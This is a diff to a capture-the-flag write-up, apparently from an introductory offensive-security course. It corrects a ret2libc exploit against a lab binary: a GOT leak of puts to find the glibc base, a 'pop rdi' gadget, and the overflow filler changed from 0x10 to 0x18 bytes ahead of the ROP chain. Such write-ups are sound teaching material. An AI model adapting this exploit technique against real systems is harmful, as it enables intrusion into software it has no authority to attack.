@@ -103,7 +103,7 @@ Looks like the input takes in 8 bytes because the last part of my entry is left 
 
 The input value indeed takes in 8 bytes. Then it's treated like a pointer. Since puts() was called once, I can send in the GOT address for puts to get a base address. It also takes in another input of up to 0x40 bytes. I'll use this to own the stack. Building solver...
 
-Firs I need some gadgets. None in ez_target, checking glibc.
+First I need some gadgets. None in ez_target, checking glibc.
 ```python
 r = ROP("./libc.so.6")
 [*] '/mnt/csgy9223_IntroOffSec/week_7/libc.so.6'
@@ -120,13 +120,13 @@ r = ROP("./libc.so.6")
 Gadget(0x2a3e5, ['pop rdi', 'ret'], ['rdi'], 0x8)
 ```
 Plan of attack:
-- Get address of puts from the GOT
+- Get address of puts from the GOT since it's already called when we send in our GOT value
 - Get base address using glibc puts() offset (we need this to get the address of system out of glibc)
 - Create rop chain and payload adding the base address
 
 The payload buffer is 0x58 bytes off of rip. How can I get there with 0x40 bytes? The memcpy() will copy the contents of the second buffer into the first buffer, giving me the length I need to do a BOF.
 
-Since it's 0x18 bytes of the ret, I'll send in 0x10 bytes of filler, followed by my rop chain.
+Since it's 0x18 bytes of the ret, I'll send in 0x18 bytes of filler, followed by my rop chain.
 
 ```python
 chain = [
@@ -138,7 +138,7 @@ chain = [
 
 
 p.recvline(b'shell!')
-p.sendline(b'A' * 0x10 + b"".join([p64(c) for c in chain]))
+p.sendline(b'A' * 0x18 + b"".join([p64(c) for c in chain]))
 ```
 
 Results:
